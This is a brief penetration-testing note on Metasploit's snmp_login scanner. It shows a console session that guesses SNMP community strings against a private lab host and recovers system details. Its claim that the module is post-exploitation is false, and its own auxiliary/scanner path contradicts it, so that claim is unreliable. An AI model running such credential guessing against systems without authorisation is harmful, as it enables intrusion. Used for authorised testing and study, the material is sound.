- The SNMP_login module in Metasploit is designed to test the security of SNMP-enabled devices by attempting to authenticate to SNMP services using a list of usernames and passwords.
- The module can be used to gather information about the device, such as its configuration settings, running services, and other system information.
- The SNMP_login module is a post-exploitation module, which means that it can only be used once the attacker has already gained access to the target system or network.
# Code - 
```python
msf6 > use auxiliary/scanner/snmp/snmp_login
msf6 auxiliary(scanner/snmp/snmp_login) > set RHOSTS 192.168.216.11
RHOSTS => 192.168.216.11
msf6 auxiliary(scanner/snmp/snmp_login) > run

[+] 192.168.216.11:161 - Login Successful: public (Access level: read-only); Proof (sysDescr.0): Hardware: AMD64 Family 23 Model 24 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.1 (Build 7601 Multiprocessor Free)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed```